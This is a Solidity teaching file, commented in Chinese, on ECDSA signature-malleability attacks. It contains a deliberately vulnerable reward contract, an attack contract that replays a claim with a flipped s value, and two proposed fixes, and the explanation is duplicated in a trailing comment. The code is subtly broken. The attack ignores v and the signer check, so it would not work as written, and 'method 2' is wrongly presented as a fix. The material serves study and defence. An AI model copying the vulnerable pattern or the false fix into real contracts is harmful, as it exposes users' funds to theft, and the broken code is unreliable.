// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/**
 * Signature Malleability（签名可塑性） 是一种针对以太坊智能合约的攻击方式，攻击者可以通过修改签名的形式（但不改变签名的有效性）来绕过某些合约的验证逻辑。
 * 这种攻击通常发生在合约依赖签名的唯一性来防止重放攻击或其他安全机制时。
 *
 * 1. 签名可塑性的原理
 * 以太坊使用的签名算法是 ECDSA（椭圆曲线数字签名算法）。一个有效的 ECDSA 签名由两个部分组成：(r, s, v)，其中：
 * r 和 s 是签名的核心部分。
 * v 是恢复标识符，用于确定签名的公钥。
 * 在 ECDSA 中，签名的 s 值可以被修改为 n - s（其中 n 是椭圆曲线的阶数），而签名仍然有效。这种修改不会改变签名的有效性，但会生成一个不同的签名值。
 *
 * 如果合约依赖于签名的唯一性（例如，将签名存储在映射中以防止重放攻击），攻击者可以利用签名可塑性绕过这种保护。
 */

/*/////////////////////////////////////////////
                   被攻击合约 
/////////////////////////////////////////////*/
contract SignatureMalleability {
    mapping(bytes32 => bool) public usedSignatures;

    function claimReward(bytes32 message, uint8 v, bytes32 r, bytes32 s) public {
        // 检查签名是否有效
        address signer = ecrecover(message, v, r, s);
        require(signer == msg.sender, "Invalid signature");

        // 检查签名是否已被使用
        bytes32 signatureHash = keccak256(abi.encodePacked(r, s));
        require(!usedSignatures[signatureHash], "Signature already used");

        // 标记签名已使用
        usedSignatures[signatureHash] = true;

        // 发放奖励
        payable(msg.sender).transfer(1 ether);
    }
}

/*/////////////////////////////////////////////
                   攻击合约
/////////////////////////////////////////////*/
interface ISignatureMalleability {
    function claimReward(bytes32 message, uint8 v, bytes32 r, bytes32 s) external;
}

contract SignatureMalleabilityAttack {
    address public target; // 目标合约地址
    address public attacker; // 攻击者地址

    constructor(address _target) {
        target = _target;
        attacker = msg.sender;
    }

    function attack(bytes32 message, uint8 v, bytes32 r, bytes32 s) public {
        // 调用目标合约的 claimReward 函数，使用原始签名
        ISignatureMalleability(target).claimReward(message, v, r, s);

        // 修改 s 值，生成新的签名
        bytes32 newS = bytes32(0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141 - uint256(s));

        // 调用目标合约的 claimReward 函数，使用新的签名
        ISignatureMalleability(target).claimReward(message, v, r, newS);
    }

    // 接收 ETH 的回退函数
    receive() external payable {}
}

/*
攻击过程:
1、用户生成一个有效的签名 (r, s, v) 并调用 claimReward 函数领取奖励。
2、合约将签名的哈希值 keccak256(abi.encodePacked(r, s)) 存储在 usedSignatures 映射中，以防止重放攻击。
3、攻击者通过修改 s 值为 n - s，生成一个新的有效签名 (r, n - s, v)。
4、攻击者使用新的签名再次调用 claimReward 函数。
5、由于 keccak256(abi.encodePacked(r, n - s)) 是一个新的哈希值，合约无法检测到签名已被使用，攻击者成功领取第二次奖励。
 */

/*
 修复方法
为了防止签名可塑性攻击，可以使用以下方法：

方法 1：限制 s 值的范围
在 ECDSA 中，s 值的有效范围是 [1, n/2]。通过限制 s 值不超过 n/2，可以防止攻击者生成可塑性签名。

修复后的合约：
pragma solidity ^0.8.0;

contract FixedSignatureMalleability {
    mapping(bytes32 => bool) public usedSignatures;

    function claimReward(bytes32 message, uint8 v, bytes32 r, bytes32 s) public {
        // 检查 s 值是否在有效范围内
        require(uint256(s) <= 0x7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF5D576E7357A4501DDFE92F46681B20A0, "Invalid s value");

        // 检查签名是否有效
        address signer = ecrecover(message, v, r, s);
        require(signer == msg.sender, "Invalid signature");

        // 检查签名是否已被使用
        bytes32 signatureHash = keccak256(abi.encodePacked(message, v, r, s));
        require(!usedSignatures[signatureHash], "Signature already used");

        // 标记签名已使用
        usedSignatures[signatureHash] = true;

        // 发放奖励
        payable(msg.sender).transfer(1 ether);
    }
}

Signature Malleability（签名可塑性） 是一种针对以太坊智能合约的攻击方式，攻击者可以通过修改签名的形式（但不改变签名的有效性）来绕过某些合约的验证逻辑。这种攻击通常发生在合约依赖签名的唯一性来防止重放攻击或其他安全机制时。

以下是一个详细的解释和示例：

1. 签名可塑性的原理
以太坊使用的签名算法是 ECDSA（椭圆曲线数字签名算法）。一个有效的 ECDSA 签名由两个部分组成：(r, s, v)，其中：

r 和 s 是签名的核心部分。
v 是恢复标识符，用于确定签名的公钥。
在 ECDSA 中，签名的 s 值可以被修改为 n - s（其中 n 是椭圆曲线的阶数），而签名仍然有效。这种修改不会改变签名的有效性，但会生成一个不同的签名值。

如果合约依赖于签名的唯一性（例如，将签名存储在映射中以防止重放攻击），攻击者可以利用签名可塑性绕过这种保护。

2. 攻击示例
假设有一个合约，允许用户通过签名来领取奖励。合约会检查签名是否有效，并将签名存储在映射中以防止重放攻击。

有漏洞的合约
pragma solidity ^0.8.0;

contract SignatureMalleability {
    mapping(bytes32 => bool) public usedSignatures;

    function claimReward(bytes32 message, uint8 v, bytes32 r, bytes32 s) public {
        // 检查签名是否有效
        address signer = ecrecover(message, v, r, s);
        require(signer == msg.sender, "Invalid signature");

        // 检查签名是否已被使用
        bytes32 signatureHash = keccak256(abi.encodePacked(r, s));
        require(!usedSignatures[signatureHash], "Signature already used");

        // 标记签名已使用
        usedSignatures[signatureHash] = true;

        // 发放奖励
        payable(msg.sender).transfer(1 ether);
    }
}
攻击过程
用户生成一个有效的签名 (r, s, v) 并调用 claimReward 函数领取奖励。
合约将签名的哈希值 keccak256(abi.encodePacked(r, s)) 存储在 usedSignatures 映射中，以防止重放攻击。
攻击者通过修改 s 值为 n - s，生成一个新的有效签名 (r, n - s, v)。
攻击者使用新的签名再次调用 claimReward 函数。
由于 keccak256(abi.encodePacked(r, n - s)) 是一个新的哈希值，合约无法检测到签名已被使用，攻击者成功领取第二次奖励。
3. 修复方法
为了防止签名可塑性攻击，可以使用以下方法：

方法 1：限制 s 值的范围
在 ECDSA 中，s 值的有效范围是 [1, n/2]。通过限制 s 值不超过 n/2，可以防止攻击者生成可塑性签名。

修复后的合约：

pragma solidity ^0.8.0;

contract FixedSignatureMalleability {
    mapping(bytes32 => bool) public usedSignatures;

    function claimReward(bytes32 message, uint8 v, bytes32 r, bytes32 s) public {
        // 检查 s 值是否在有效范围内
        require(uint256(s) <= 0x7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF5D576E7357A4501DDFE92F46681B20A0, "Invalid s value");

        // 检查签名是否有效
        address signer = ecrecover(message, v, r, s);
        require(signer == msg.sender, "Invalid signature");

        // 检查签名是否已被使用
        bytes32 signatureHash = keccak256(abi.encodePacked(message, v, r, s));
        require(!usedSignatures[signatureHash], "Signature already used");

        // 标记签名已使用
        usedSignatures[signatureHash] = true;

        // 发放奖励
        payable(msg.sender).transfer(1 ether);
    }
}


方法 2：使用消息哈希而不是签名哈希
在存储已使用的签名时，可以结合消息和签名一起哈希，而不是仅哈希签名的 r 和 s 值。这样可以防止攻击者通过修改签名绕过检查。

修复后的合约：、
pragma solidity ^0.8.0;

contract FixedSignatureMalleability {
    mapping(bytes32 => bool) public usedSignatures;

    function claimReward(bytes32 message, uint8 v, bytes32 r, bytes32 s) public {
        // 检查签名是否有效
        address signer = ecrecover(message, v, r, s);
        require(signer == msg.sender, "Invalid signature");

        // 检查签名是否已被使用
        bytes32 signatureHash = keccak256(abi.encodePacked(message, v, r, s));
        require(!usedSignatures[signatureHash], "Signature already used");

        // 标记签名已使用
        usedSignatures[signatureHash] = true;

        // 发放奖励
        payable(msg.sender).transfer(1 ether);
    }
}
 */
